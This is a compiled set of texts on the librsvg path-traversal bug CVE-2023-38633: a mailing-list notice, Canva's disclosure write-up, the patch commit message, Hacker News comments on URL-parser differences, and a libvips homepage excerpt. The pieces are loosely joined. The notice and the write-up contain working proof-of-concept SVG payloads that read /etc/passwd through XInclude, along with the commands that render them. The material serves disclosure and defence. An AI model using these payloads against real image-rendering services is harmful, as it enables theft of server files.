Zac's writeup on how the bug was found is now available at:
<https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/>

It points to a root cause of mixing two different URL parsers, with one used to
validate the URL and a different one used to load the content from it.

Subject: CVE-2023-38633 in librsvg: Arbitrary file read when xinclude href has
 special characters

I haven't seen this go by yet, so for those who haven't seen it:

<https://gitlab.gnome.org/GNOME/librsvg/-/issues/996> reports:

CVE-2023-38633: Arbitrary file read when xinclude href has special characters

This was reported by Zac Sims.

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="300" height="300" xmlns:xi="<http://www.w3.org/2001/XInclude>">
   <rect width="300" height="300" style="fill:rgb(255,255,255);" />
   <text x="10" y="100">
     <xi:include href=".?../../../../../../../../../../etc/passwd" parse="text"
encoding="UTF-8">
       <xi:fallback>file not found</xi:fallback>
     </xi:include>
   </text>
</svg>

This ends up actually including the contents of /etc/passwd, bypassing the
checks in UrlResolver::resolve_href().

The above linked bug report provides further analysis and links to merge
requests for the fixes.   Fixes have been published in new releases of
librsvg for many release trains:

     2.56.3
     2.55.3
     2.54.6
     2.52.10
     2.50.8
     2.48.11
     2.46.6

# When URL parsers disagree (CVE-2023-38633)

Discovery and walkthrough of CVE-2023-38633 in librsvg, when two URL parser implementations (Rust and Glib) disagree on file scheme parsing leading to path traversal.

As part of Canva's ongoing mission to build the world's most trusted platform, we continuously evaluate the security of our software dependencies. Identifying and resolving vulnerabilities in third-party dependencies helps improve the security of Canva, as well as the wider internet. Coupled with security controls like sandboxing, we continue to make it increasingly difficult for attackers to reach their objectives by exploiting third-party dependencies.

One such dependency Canva uses is [librsvgâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg) (via [libvipsâ (opens in a new tab or window)](https://www.libvips.org)). We use librsvg to quickly render user-provided SVGs into thumbnails later displayed as PNGs. By exploiting differences in URL parsers when rendering an SVG with librsvg, we showed it's possible to include arbitrary files from disk in the resulting image. The [librsvg maintainers quickly patched the issueâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg/-/issues/996) and issued a security vulnerability ([CVE-2023-38633â (opens in a new tab or window)](https://nvd.nist.gov/vuln/detail/CVE-2023-38633)).

We're sharing this research as another example of the [dangers of mixing URL parsersâ (opens in a new tab or window)](https://daniel.haxx.se/blog/2022/01/10/dont-mix-url-parsers/), especially because the example we discovered is very subtle.

A special thanks to Federico (librsvg maintainer), John (libvips maintainer), and Lovell ([Sharpâ (opens in a new tab or window)](https://sharp.pixelplumbing.com) maintainer) for their work and excellent coordinated response.

## Prequel

The [XML Parsing Issues in Inkscape in CLIâ (opens in a new tab or window)](https://github.com/elttam/publications/blob/master/writeups/inkscape-xml.md) write-up from Elttam's Victor Kahan shows how Inkscape is vulnerable to path traversal when rendering SVGs. Extending Victor's research, we found that while XInclude wasn't directly supported in Inkscape 0.9, it exhibited some interesting behavior when an SVG was nested in another SVG.

For example, consider the following inner SVG.

```
<?xml version="1.0" encoding="UTF-8" standalone="no" ?><svg width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">  <rect width="300" height="300" style="fill:rgb(255,204,204);" />  <text x="0" y="100">    <xi:include href="/etc/passwd" parse="text" encoding="ASCII">      <xi:fallback>file not found</xi:fallback>    </xi:include>  </text></svg>
```
XMLCopy

We encoded it as a URI and placed it inside another SVG, `outer.svg`.

```
<?xml version="1.0" encoding="UTF-8" standalone="no" ?><svg width="300" height="300" xmlns:xlink="http://www.w3.org/1999/xlink">  <image    xlink:href="data:image/svg;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+Cjxzdmcgd2lkdGg9IjMwMCIgaGVpZ2h0PSIzMDAiIHhtbG5zOnhpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hJbmNsdWRlIj4KICA8cmVjdCB3aWR0aD0iMzAwIiBoZWlnaHQ9IjMwMCIgc3R5bGU9ImZpbGw6cmdiKDI1NSwyMDQsMjA0KTsiIC8+CiAgPHRleHQgeD0iMCIgeT0iMTAwIj4KICAgIDx4aTppbmNsdWRlIGhyZWY9Ii9ldGMvcGFzc3dkIiBwYXJzZT0idGV4dCIgZW5jb2Rpbmc9IkFTQ0lJIj4KICAgICAgPHhpOmZhbGxiYWNrPmZpbGUgbm90IGZvdW5kPC94aTpmYWxsYmFjaz4KICAgIDwveGk6aW5jbHVkZT4KICA8L3RleHQ+Cjwvc3ZnPg=="  /></svg>
```
XMLCopy

When run with Inkscape 0.92.4, it produced an image where the XInclude fallback was triggered.

```
$ inkscape -f test.svg -e out.png -w 300
```
SHELLCopy

![File not found](/_next/static/media/file-not-found.06d2aece.png)

The fact that Xinclude was supported at all was surprising because it can often lead to security vulnerabilities. While Inkscape isn't used by the Canva product, [digging into the Inkscape code pathâ (opens in a new tab or window)](https://gitlab.com/inkscape/inkscape/-/blob/0.92.x/src/display/cairo-utils.cpp#L230) showed that nested images are loaded with [GdkPixbufâ (opens in a new tab or window)](https://docs.gtk.org/gdk-pixbuf/), which itself delegates SVG loading to [librsvgâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg). This was of great interest because librsvg is something that Canva *does* use.

## XInclude

[XIncludeâ (opens in a new tab or window)](https://www.w3.org/TR/xinclude/) is a mechanism for merging XML documents, which can lead to security vulnerabilities when a user-provided XML document (like an SVG) is assembled or rendered on a server.

![Xinclude example](/_next/static/media/lfi.632faec6.png)

There are two standout elements in XInclude:

* [`xi:include`](https://www.w3.org/TR/xinclude/#include_element) to include contents of a referenced URL, such as a file or HTTP request. The content being included can be plaintext or XML.
* [`xi:fallback`](https://www.w3.org/TR/xinclude/#fallback_element) to nominate content that should be rendered when the referenced content can't be loaded by `xi:Include`.

Security checks aside, the following XML document loads the contents of `/etc/passwd` when processed.

```
<?xml version="1.0" encoding="UTF-8" standalone="no" ?><example xmlns:xi="http://www.w3.org/2001/XInclude">  <xi:include href="/etc/passwd" parse="text" encoding="ASCII">    <xi:fallback>file not found</xi:fallback>  </xi:include></example>
```
XMLCopy
## There are rules

librsvg is a Rust library to render SVG images to [Cairoâ (opens in a new tab or window)](https://www.cairographics.org) surfaces. Most of the heavy lifting is now implemented in Rust, but the library relies on the Cairo and GNOME glib C libraries.

![Librsvg overview](/_next/static/media/librsvg.424574cd.png)

From the prequel, we knew librsvg supported at least some of the XInclude standards. To understand how much, [we dug into its implementationâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg/-/tree/eec9d15145da5f6e2b70c5974b3e3c6ecac876e0). As it turns out, every external URL reference in an SVG passes through a single method for validation. This includes references such as:

* `<image href="file:///something.png" />`
* `<rect filter="url('file-with-filters.svg#my_filter')" />`
* `<xi:include href="/etc/passwd" ... />`

The librsvg [url\_resolver.resolve\_hrefâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg/-/blob/eec9d15145da5f6e2b70c5974b3e3c6ecac876e0/rsvg/src/url_resolver.rs#L32) method implements some [strict security checksâ (opens in a new tab or window)](https://gnome.pages.gitlab.gnome.org/librsvg/Rsvg-2.0/class.Handle.html#security-and-locations-of-referenced-files) to restrict what references can be loaded when processing an SVG document:

* All `data:` URLs are permitted because they can't reference external files by design.
* The referenced scheme must match the "current document" scheme. For example, when processing `file:///foo/bar/example.svg`, any encountered URL must be of the `file:` scheme.
* Encountered files must be in the same directory as the current document, or within a subdirectory of the current document. This is enforced by [checking the URL pathâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg/-/blob/eec9d15145da5f6e2b70c5974b3e3c6ecac876e0/rsvg/src/url_resolver.rs#L68-85).
* All other schemes are rejected, including `http:`.

These strict rules are the reason our earlier naive XInclude tests failed. But we were very interested to see if we could bypass the rules. This could result in path traversal when processing an SVG, for example, being able to include files like `/etc/passwd` in the contents of the rendered SVG to PNG.

## Parser Mismatch

Resolving a URL within an SVG document has two steps:

1. Validate the URL as per the resolve rules mentioned earlier.
2. If successful, [load the contentsâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg/-/blob/eec9d15145da5f6e2b70c5974b3e3c6ecac876e0/rsvg/src/io.rs#L87), which parses URLs using [Gioâ (opens in a new tab or window)](https://docs.gtk.org/gio/)'s inbuilt URI parser.

Excerpts from [mod.rsâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg/-/blob/eec9d15145da5f6e2b70c5974b3e3c6ecac876e0/rsvg/src/xml/mod.rs#L509-549) and [io.rsâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg/-/blob/eec9d15145da5f6e2b70c5974b3e3c6ecac876e0/rsvg/src/io.rs#L95-122) are as follows.

```
// xml/mod.rsfn acquire(&self, href: Option<&str>, /* ... */) -> Result<(), AcquireError> {  let aurl = self.url_resolver.resolve_href(href) // ...  // ...  self.acquire_text(&aurl, encoding);}
fn acquire_text(&self, aurl: &AllowedUrl, encoding: Option<&str>) -> Result<(), AcquireError> {  let binary = io::acquire_data(aurl, None);  // ...  return result;}
// io.rspub fn acquire_data(aurl: &AllowedUrl, /* ... */) -> Result<BinaryData, IoError> {  let uri = aurl.as_str();  // ...  let file = GFile::for_uri(uri);  let (contents, _etag) = file.load_contents(cancellable)?;  // ...  return contents;  // ...}
```
RUSTCopy

Knowing there were two URL parsers at play (one to validate the URL and one to load the contents), to bypass the security checks, we needed to find URLs where the parsers disagreed.

With some quick tests, we mapped out how the URL parsers process different URLs.

| URL `file:///etc/passwd?foo=bar#baz` | Rust [`url`](https://docs.rs/url/latest/url/) parsed result |
| --- | --- |
| Scheme | `file` |
| Host | *None* |
| Path | `/etc/passwd` |
| Query | `foo=bar` |
| Fragment | `baz` |

[Gioâ (opens in a new tab or window)](https://docs.gtk.org/gio/) doesn't expose generic URL parsing (aside from GUri, which isn't on the callpath). But `g_filename_from_uri` returns on some examples.

| URL | `g_filename_from_uri` result |
| --- | --- |
| `file:///etc/passwd?foo=bar#baz` | `/etc/passwd?foo=bar#baz`  *Note:* As of [Glib commit 3986471â (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/glib/-/commit/39864716d6404766c325caf18c6bef722dc060cd), this now fails because of `?` and `#` characters. |
| `file:///etc/passwd` | `/etc/passwd` |
| `file:///etc/passwd&hello` | `/etc/passwd&hello` |
| `file:///etc/passwd@host` | `/etc/passwd@host` |
| `file://host/etc/passwd` | `/etc/passwd` |

## Bypassing Validation

Given this understanding of where the URL parsers were at, we took the relevant parts from librsvg and set up a fuzzing harness ("resolve") to run the same logic as the resolve URL logic when encountering a reference (href, XInclude, etc.) from an on-disk "current.svg" file. This allowed us to quickly test and fuzz inputs to see how the parsers and validation logic were evaluated. Some interesting outputs from fuzzing were as follows:

* `resolve 'current.svg'`: Passes as expected.
* `resolve run '../../../../../../../etc/passwd'`: Canonicalization fails with 'No such file or directory'.
* `resolve 'current.svg?../../../../../../../etc/passwd'`: Passes.
* `resolve 'none/../current.svg'`: Passes as expected.

The last 2 results showed us that `GFile::for_uri` happily resolves path traversals, including path traversals in the query string. However, the second result, `../../../../../../../etc/passwd`, failed because of the canonicalization check.

### Bypassing Canonicalization

Part of librsvg's URL validation is to canonicalize the built URL to replace .. and . segments per regular filesystem path rules. It does this using Rust's [std::fs::canonicalizeâ (opens in a new tab or window)](https://doc.rust-lang.org/std/fs/fn.canonicalize.html) (calling [realpathâ (opens in a new tab or window)](https://linux.die.net/man/3/realpath)), which throws an error if:

* The path doesn't exist.
* A non-final component in the path isn't a directory.

Because we don't always know the name of the 'current' SVG on disk, we needed to bypass canonicalization if we wanted to have a URL pass librsvg's validation. After some rapid testing, it turns out this is relatively straightforward.

```
$ realpath current.svg/home/zsims/projects/librsvg-poc/current.svg
$ realpath ./home/zsims/projects/librsvg-poc/
```
SHELLCopy

As it turns out, `realpath(".")` and `std::fs::canonicalize(".")` both return the "current directory". We can use this as a placeholder in our PoC instead of `current.svg`.

## Proof of concept

Knowing how the URL parsers mismatch, and how we can bypass canonicalization without knowing the current file name, we can build a payload to include `/etc/passwd`.

```
.?../../../../../../../etc/passwd
```
Copy

Within a `poc.svg` SVG, this looks like the following.

```
<?xml version="1.0" encoding="UTF-8" standalone="no" ?><svg width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">  <rect width="300" height="300" style="fill:rgb(255,204,204);" />  <text x="0" y="100">    <xi:include      href=".?../../../../../../../etc/passwd"      parse="text"      encoding="ASCII"    >      <xi:fallback>file not found</xi:fallback>    </xi:include>  </text></svg>
```
XMLCopy

And produces the following result.

```
$ rsvg-convert poc.svg > poc.png
```
Copy

![Proof of concept](/_next/static/media/poc.9a503f9a.png)

We get a similar result when running through vipsthumbnail.

Sensitive files within `/proc`, such as `/proc/self/environ`, failed because of character encoding.

```
$ rsvg-convert proc-poc.svg > proc-poc.pngthread 'main' panicked at 'str::ToGlibPtr<*const c_char>: unexpected '' character: NulError(21...
```
Copy

Note that this PoC only works where the SVG is loaded from a `file://`. SVGs loaded through `data:` or `resource:` schemes are not vulnerable.

## Patch

Following the report to librsvg's maintainer (see [Issue 996â (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg/-/issues/996)), Federico [patched the issueâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/librsvg/-/merge_requests/861) to add improved URL validation and use the validated URL as input into GFile. Part of the response from Federico included a heads-up to maintainers of Sharp and libvips to upgrade before the issue was disclosed publicly as [CVE-2023-38633â (opens in a new tab or window)](https://nvd.nist.gov/vuln/detail/CVE-2023-38633).

The issue also prompted some discussion about [file URL parsing in glibâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/glib/-/issues/3050), resulting in some [additional validationâ (opens in a new tab or window)](https://gitlab.gnome.org/GNOME/glib/-/merge_requests/3502) in the library.

There were a few standouts from discovery and patching:

* The [dangers of mixing URL parsersâ (opens in a new tab or window)](https://daniel.haxx.se/blog/2022/01/10/dont-mix-url-parsers/) are just as applicable to `file://` URLs and in-process use as they are for networked services and `http://` URLs.
* `file://` URLs are special. For example, the URL specification highlights [support for query strings in `file://`â (opens in a new tab or window)](https://url.spec.whatwg.org#file-state) URLs,Â but the support in the implementations we reviewed varied greatly.
* Efforts to migrate existing C code to Rust are not without risk. Although memory safety is much improved, differences in contracts (like URL parsing) can have negative security consequences.
* Make sure you're only parsing URLs once, and using that parsed value from that point onwards.
* If possible, enforce your own validation on files, like SVGs, before processing further. This is the reason [MediaWikiâ (opens in a new tab or window)](https://www.mediawiki.org/wiki/MediaWiki) is not impacted by this issue because `xi:include` elements are rejected before the SVG reaches librsvg.

## Timeline

* July 11 2023: Issue discovered.
* July 12 2023: Reported to librsvg maintainers.

In UrlResolver::resolve\_href() we now explicitly disallow URLs that
have a query string ("?") or a fragment identifier ("#").

We also explicitly check for a base URL and not resolving to a path,
for example, "<file:///base/foo.svg>" + "." would resolve to
"<file:///base/>" - this is technically correct, but we don't want to
resolve to directories.

Also, we pass a canonicalized path name as a URL upstream, so that
g\_file\_new\_from\_url() will consume it later, instead of passing the
original and potentially malicious URL.

Fixes [#996 (closed)](https://gitlab.gnome.org/GNOME/librsvg/-/issues/996 "CVE-2023-38633: Arbitrary file read when xinclude href has special characters")

Firewall Rules... we had an API written in Go, and the edge written in Lua. The risk I foresaw was that building rules that act on URLs and perform matching, and testing those, in one language (Go) that were then deployed and executed in another (Lua) would lead to a risk that the difference in the behaviour of the two engines (no matter how much they implemented the same spec) would result in a rule being created that behaved ever so differently elsewhere... for me, that was a huge hole as if it was known it would be leveraged. The first piece of Rust in Cloudflare was introduced for this reason and for this project. We needed a single piece of code to implement the filters that could be executed from Lua, and that Go could call too. It needed to ensure that only a single piece of code was responsible for things like UPPER(), LOWER(), URL\_PARSE() precisely to prevent any differences being leveraged. | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [notsahil](user?id=notsahil) [on Sept 7, 2023](item?id=37417961)   | [parent](#37417633) | [next](#37417820) [–]  WAF reminded me of the Cloudflare outage on July 2, 2019 due to small regex mistake [1] [1] [https://blog.cloudflare.com/details-of-the-cloudflare-outage...](https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/) | | --- | --- | --- | | | |  |  | [buro9](user?id=buro9) [on Sept 7, 2023](item?id=37418066)   | [root](#37417633) | [parent](#37417961) | [next](#37417820) [–]  Yup, and the filters described above replaced the pcre regex matching in lua. That was already planned at the time of this incident, but this incident accelerated the pace at which the new system was put in place as well as introduced controls and process for the release of waf rules (regardless of what engine they were applied in) | | --- | --- | --- | | | |  |  | [SerCe](user?id=SerCe) [on Sept 7, 2023](item?id=37417820)   | [parent](#37417633) | [prev](#37417961) | [next](#37422831) [–]  Out of interest, was this the project that eventually became wirefilter [1]?

Uses wireshark display filters syntax to implement the ability to match traffic at any part of the stack. It's still used internally, but clearly they stopped updating the OSS version just after I left. They were updating things to make it fully compatible for everything owasp when I left which meant additions beyond the wireshark definition of display filters. Everything firewall and WAF was moving to the filters and also other traffic matching features too. | | --- | --- | --- | | | |  |  | [SerCe](user?id=SerCe) [on Sept 7, 2023](item?id=37418027)   | [root](#37417633) | [parent](#37417915) | [next](#37422831) [–]  Thank you for releasing it! I adopted wirefilter for a firewall rule testing project, firewalker [1]. But indeed, I wish Cloudflare kept maintaining its OSS version.

Either not maintaining the public version, or promising to open things that then don't see the light of day (quicksilver database and replication, and their Rust reverse proxy and nginx/lua replacement - both of which were announced but never released). Most of what is OSS at cloudflare came in from elsewhere (V8) or was needed for collaboration (IETF), rather than started at cloudflare and opened. | | --- | --- | --- | | | |  |  | [Analemma\_](user?id=Analemma_) [on Sept 7, 2023](item?id=37422831)   | [parent](#37417633) | [prev](#37417820) | [next](#37418061) [–]  This is such a cool example of real-world defensive engineering.

We weren't going to use C (Cloudbleed), cgo didn't give us as much control over the FFI as we wanted and produced slightly harder to read output (maintainability for me, is everything — always write code that the drunk at 2am future version of yourself can understand when you're paged), we didn't necessarily want another garbage collected process despite being good at this (Cloudflare's DNS server is written in Go), we wanted memory safety and wanted to keep things small (Go or Rust stand out), we wanted compile time safety over runtime errors, we believed that Rust macros would help make the filter code more readable / maintainable than rolling our own parser in Go or using YACC (see earlier point about your future self maintaining this at an unGodly hour)... it's not like anything was a determining factor, but the reasons accrued until it felt overwhelming. We certainly were not looking to add another language at the time as being first to do so incurs pushback from the org, adding into all of the build and release chains, and the typical higher bar for proving you know what you're doing. Once done everyone can benefit from having the option of another language and being able to select the right tool for the job, but going first incurs a legitimate cost. | | --- | --- | --- | | | |  |  | [bkallus](user?id=bkallus) [on Sept 7, 2023](item?id=37419025)   | [prev](#37417633) | [next](#37420464) [–]  A student and I have been using coverage-guided grammar-aware differential fuzzing to discover bugs in URL parsers for a while now. There is extreme variation in this space; it's trivial to turn up meaningful bugs in widely-used URL parsers. ".://" is a particularly egregious example. (and, by the same principle, "evil.com://good.com") - Python 3.6's urllib.parse sees the "." as the URL's scheme, and an empty authority. - Python 3.11's urllib.parse sees the entire ".://" as the URL's path. - urllib3.util.parse\_urlsees the "." as the URL's hostname, the ":" as the separator for an empty port number, and the "//" as the path. (this is one of the most downloaded packages on PyPI) - Boost::URL rejects the URL outright. If you're going by RFC 3986, then only Boost::URL is exhibiting the correct behavior. If you're going by the WHATWG URL standard, then I don't know which one of these behaviors (if any) is correct. If you're interested in collaborating on this project, please send me email. My address is in the footer at <https://kallus.org> | | --- | --- | --- | | | |  |  | [bbayles](user?id=bbayles) [on Sept 7, 2023](item?id=37420278)   | [parent](#37419025) | [next](#37419467) [–]  WHATWG rejects ".://", yeah? It's not the most readable spec, but there's a tester here: <https://jsdom.github.io/whatwg-url/> I recently published bindings for ada (an implementation of the WHATWG URL Spec) for Python with the hope of having something that follows a single standard. | | --- | --- | --- | | | |  |  | [LegionMammal978](user?id=LegionMammal978) [on Sept 7, 2023](item?id=37420454)   | [root](#37419025) | [parent](#37420278) | [next](#37419467) [–]  Indeed, ".://" is a hard error under the WHATWG URL spec. If the URL doesn't start with an ASCII alpha character, then the scheme start state transitions to the no scheme state [0]. In that state, if there's no base URL that the input is relative to, then parsing must fail [1]. However, "evil.com://good.com" *is* a valid URL string per WHATWG, since its state machine accepts "." within the scheme after the first codepoint. The resulting URL object has a scheme of "evil.com", a host of "good.com", an empty path, and a null port, query, and fragment.

As a relative URL, it’s fine, just like “example.com” is invalid as an absolute URL but valid as a relative URL. | | --- | --- | --- | | | |  |  | [LegionMammal978](user?id=LegionMammal978) [on Sept 7, 2023](item?id=37422553)   | [root](#37419025) | [parent](#37422064) | [next](#37419467) [–]  True; I neglected to mention relative URL parsing, mostly since most URL manipulation I've personally done has been with absolute URLs. | | --- | --- | --- | | | |  |  | [gmac](user?id=gmac) [on Sept 7, 2023](item?id=37419467)   | [parent](#37419025) | [prev](#37420278) | [next](#37420464) [–]  As another example of an egregious difference that might bite you, compare this JS in recent Node vs web browsers: ```     new URL('postgres://user:pass@host/db')  ``` Node parses this as if it were a web address, into protocol, username, password, host, pathname, etc. Browsers just parse out the protocol and call everything else a pathname. | | --- | --- | --- | | | |  |  | [btilly](user?id=btilly) [on Sept 7, 2023](item?id=37422433)   | [root](#37419025) | [parent](#37419467) | [next](#37426799) [–]  Browsers do that for a good reason. They used to do the protocol, username, password, host, pathname, etc. But scammers used it to have a user name that looked like a well-known URL, while actually directing the user to a domain under the scammer's control. Not honoring the spec was therefore a security feature. | | --- | --- | --- | | | |  |  | [cma](user?id=cma) [on Sept 7, 2023](item?id=37425890)   | [root](#37419025) | [parent](#37422433) | [next](#37426799) [–]  Why not just delete the url bar contents after attempting that url or something? Or take to a warning page. | | --- | --- | --- | | | |  |  | [btilly](user?id=btilly) [on Sept 7, 2023](item?id=37426231)   | [root](#37419025) | [parent](#37425890) | [next](#37426799) [–]  Any such decision requires no longer honoring <https://www.rfc-editor.org/rfc/rfc1738>. | | --- | --- | --- | | | |  |  | [cxr](user?id=cxr) [on Sept 8, 2023](item?id=37432113)   | [root](#37419025) | [parent](#37426231) | [next](#37426799) [–]  Please be more specific. | | --- | --- | --- | | | |  |  | [btilly](user?id=btilly) [on Sept 8, 2023](item?id=37436031)   | [root](#37419025) | [parent](#37432113) | [next](#37426799) [–]  Section 3.1 specifies ```     /<user>:<password>@<host>:<port>/<url-path>  ``` Which means if you're presented with that and don't send it to that host, you've violated the RFC. But this was demonstrably resulting in confused users being sent to scammer's domains. | | --- | --- | --- | | | |  |  | [cxr](user?id=cxr) [on Sept 8, 2023](item?id=37438224)   | [root](#37419025) | [parent](#37436031) | [next](#37426799) [–]  That ("if you're presented with that and don't send it to that host, you've violated the RFC") has nothing to do with the comment you responded to, which described a UI choice compatible with RFC 3986, which says "Applications should not render as clear text any data after the first colon (":") character found within a userinfo subcomponent" (and which also goes on to say "Applications may choose to ignore or reject such data when it is received as part of a reference"). | | --- | --- | --- | | | |  |  | [silverwind](user?id=silverwind) [on Sept 7, 2023](item?id=37426799)   | [root](#37419025) | [parent](#37419467) | [prev](#37422433) | [next](#37420464) [–]  `URL` in node and browser is supposed to be compatible, this looks like a bug (browser ignoring protocols they don't know). | | --- | --- | --- | | | |  |  | [cxr](user?id=cxr) [on Sept 8, 2023](item?id=37432638)   | [root](#37419025) | [parent](#37426799) | [next](#37420464) [–]  URL parsing semantics are defined by and dependent upon the scheme. (That's spec.) By definition, if you don't recognize the scheme, you cannot guarantee a correctly parsed URL. From RFC 1738: *The Internet Assigned Numbers Authority (IANA) will maintain a registry of URL schemes. Any submission of a new URL scheme must include a definition of an algorithm for accessing of resources within that scheme and the syntax for representing such a scheme.* The behavior described (extracting the scheme and treating the rest as an opaque string) is pretty much the only thing you *can* do when the scheme is unrecognized. (The other options being to throw an exception or return null.) Based on the description, it sounds like neither are breaking spec—it's just that Node supports "postgres". That is, unless it's true that Node's URL implementation is supposed to match what browsers do, in which case Node is breaking spec—its own. | | --- | --- | --- | | | |  |  | [bkallus](user?id=bkallus) [on Sept 8, 2023](item?id=37433586)   | [root](#37419025) | [parent](#37432638) | [next](#37420464) [–]  RFC 3986 provides a generic URI grammar that is not scheme-specific, though other standards that define URL schemes may choose to subset the subset that grammar as they see fit. If a URL parser does not recognize a scheme, I would expect it to parse the URL using the generic parsing procedure. | | --- | --- | --- | | | |  |  | [cxr](user?id=cxr) [on Sept 8, 2023](item?id=37438275)   | [root](#37419025) | [parent](#37433586) | [next](#37420464) [–]  Well, they don't.

I worked in the group that developed the iOS/macOS versions of the apps and we had a number of kludges in place to deal with conversion between these C++ classes and NSURL and CFURL. In my time on different occasions devs discovered the flaws and composed lengthy emails explaining the fixes that needed to be made, but the C++ class was too entrenched to be fixed. That was about 5 years ago, I doubt it has changed. | | --- | --- | --- | | | |  |  | [paulddraper](user?id=paulddraper) [on Sept 8, 2023](item?id=37429211)   | [parent](#37420464) | [next](#37419206) [–]  I remember having some difficulty with characters for HTML URLs on the clipboard (for images) that happened only on the Mac version of a certain office app, but not the windows version | | --- | --- | --- | | | |  |  | [afandian](user?id=afandian) [on Sept 7, 2023](item?id=37419206)   | [prev](#37420464) | [next](#37418279) [–]  I recently had a wild ride with using java.net.URL and java.net.URI, to parse and deconstruct URIs so they can be stored in a database with at least a little normalization. The documentation page is great but the API is bizarre. So many different constructors with different permutations of whether or not they expect various segments to be URL-encoded. If nothing else, the complexity convinced me not to write my own! - <https://docs.oracle.com/javase/8/docs/api/java/net/URI.html> - <https://docs.oracle.com/javase/8/docs/api/java/net/URL.html> | | --- | --- | --- | | | |  |  | [jeroenhd](user?id=jeroenhd) [on Sept 7, 2023](item?id=37419766)   | [parent](#37419206) | [next](#37419722) [–]  One of the weirdest things about Java's URL API is this: ```     equals               Two hosts are considered equivalent if both host names can be resolved into the same IP addresses; else if either host name can't be resolved, the host names must be equal without regard to case; or both host names equal to null.  ``` If you're doing bulk operations on stored URLs, you may just be sending out tons of DNS resolutions without ever calling an obvious networking API (like openConnection). If your DNS is down or slow, equals() will block. I'm sure most Java programmer here has learned this lesson, but new programmers get surprised by this every time. | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [on Sept 7, 2023](item?id=37419936)   | [root](#37419206) | [parent](#37419766) | [next](#37420765) [–]  So I'm certainly not a Java developer and I barely know very much about urls, but isn't that a semantically surprising comparison as well?

And then RFC 3986 came and made incompatible changes, e.g. by moving asterisk to reserved characters (I could not find an explanation why in W3C email archive - someone asked this question at the draft stage, but it was not answered there). | | --- | --- | --- | | | |  |  | [richbell](user?id=richbell) [on Sept 7, 2023](item?id=37418279)   | [prev](#37419206) | [next](#37423332) [–]  Speaking of URL parsing differences, Python's urllib library recently had a CVE for failing to strip whitespace from the scheme and domain. <https://github.com/python/cpython/issues/102153> | | --- | --- | --- | | | |  |  | [saltcured](user?id=saltcured) [on Sept 7, 2023](item?id=37423332)   | [prev](#37418279) | [next](#37418678) [–]  One thing that drives me mad on the Python side of things is the way frameworks and middleware (even the WSGI spec) corrupt the most basic "quoting" mechanism of RFC 3986. All of these layers of trying to be clever or friendly subvert the correctness of the original concept. And these broken approaches become precedents that reinforce in the culture of web breakage and compatibility. Specifically, "reserved" characters have a different meaning from their URL quoted form. It is obvious that the intent of this was to allow their use as meta-syntax to separate parts of a URL that might then have the quoted form embedded in them. But every stupid middleware layer that tries to unquote \_before\_ parsing and routing is throwing away this information and making it impossible to know what was the original meta-syntax and what was embedded quoted material that might be a fragment derived from arbitrary, user-generated content. | | --- | --- | --- | | | |  |  | [richbell](user?id=richbell) [on Sept 7, 2023](item?id=37425848)   | [parent](#37423332) | [next](#37418678) [–]  That sounds frustrating.

But instead, it gets unquoted at the WSGI layer into: ```    /foo/element/two/bar  ``` and then such routing would fail entirely or get the arguments wrongly chopped up, depending on how routing patterns work in the framework. This same problem applies to all the "reserved" chars from the spec, e.g. slashes, semi-colons, colons, equal-sign, asterisk, parentheses, and more. | | --- | --- | --- | | | |  |  | [brasetvik](user?id=brasetvik) [on Sept 7, 2023](item?id=37418678)   | [prev](#37423332) | [next](#37420908) [–]  This is also a pretty cool presentation on the topic: [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-Ne...](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) | | --- | --- | --- | | | |  |  | [hoten](user?id=hoten) [on Sept 7, 2023](item?id=37420908)   | [prev](#37418678) | [next](#37426072) [–]  Browsers have discrepancies too of course.

libvips is a [demand-driven, horizontally
threaded](https://github.com/libvips/libvips/wiki/Why-is-libvips-quick)
image processing library. Compared to similar
libraries, [libvips runs quickly and uses little
memory](https://github.com/libvips/libvips/wiki/Speed-and-memory-use).
libvips is licensed under the [LGPL-2.1-or-later](https://spdx.org/licenses/LGPL-2.1-or-later).

It has around [300 operations](/API/current/func-list.html) covering
arithmetic, histograms, convolution, morphological operations, frequency
filtering, colour, resampling, statistics and others. It supports a large
range of [numeric types](/API/current/VipsImage.html#VipsBandFormat),
from 8-bit int to 128-bit complex. Images can have any number of bands.
It supports a good range of image formats, including JPEG, JPEG 2000, JPEG XL,
TIFF, PNG, WebP, HEIC, AVIF, FITS, Matlab, OpenEXR, PDF, SVG, HDR, PPM / PGM /
PFM, CSV, GIF, Analyze, NIfTI, DeepZoom, and OpenSlide. It can also load
images via ImageMagick or GraphicsMagick, letting it work with formats
like DICOM.

It comes with bindings for [C](/API/current/using-from-c.html),
[C++](API/current/using-from-cpp.html),
and the [command-line](/API/current/using-cli.html). Full bindings
are available for [Ruby](https://rubygems.org/gems/ruby-vips),
[Python](https://pypi.python.org/pypi/pyvips),
[PHP](https://github.com/libvips/php-vips),
[.NET](https://www.nuget.org/packages/NetVips),
[Go](https://github.com/davidbyttow/govips),
